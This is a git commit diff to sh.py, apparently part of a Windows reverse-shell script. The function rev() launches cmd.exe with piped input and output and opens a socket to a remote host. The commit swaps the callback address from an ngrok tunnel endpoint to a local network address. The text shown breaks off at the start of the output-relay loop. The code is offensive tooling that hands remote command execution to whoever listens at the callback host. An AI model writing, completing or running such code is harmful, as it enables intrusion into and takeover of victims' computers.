fceeb15ff8c6ed0ceeb16e21caf6440080db9152
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-04 17:10:17 +0300

    Update sh.py

--- sh.py
+++ sh.py
@@ -7,7 +7,7 @@ import time
 def rev():
    p = sp.Popen(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
    s = socket.socket()
-   s.connect(('4.tcp.eu.ngrok.io', 19814))
+   s.connect(('192.168.1.16', 1))
 
    def s_o():
        while True:
